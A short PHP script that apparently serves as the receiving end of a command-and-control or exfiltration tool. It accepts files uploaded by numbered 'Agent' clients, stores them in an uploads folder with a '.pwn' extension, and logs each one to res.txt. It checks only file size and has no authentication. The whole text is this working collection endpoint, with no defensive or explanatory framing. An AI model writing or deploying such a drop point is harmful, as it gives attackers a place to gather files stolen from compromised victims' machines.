<?php
$id=$_REQUEST[ 'id' ];
$sid = strval($id);

$target_dir = "uploads/";
$target_file = $target_dir . basename($_FILES["data"]["name"]).".pwn";
$uploadOk = 1;
$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));


// Check file size
if ($_FILES["data"]["size"] > 500000) {
  echo "Sorry, your file is too large.";
  $uploadOk = 0;
}


if ($uploadOk == 0) {
} else {
  if (move_uploaded_file($_FILES["data"]["tmp_name"] , $target_file)) {
  $file = 'res.txt';
  $current = file_get_contents($file);
  $current .= "Agent ".$id." => File ".basename($_FILES["data"]["name"])." Saved to $target_file";
  file_put_contents($file, $current);  
  } else {
  }
}

?>
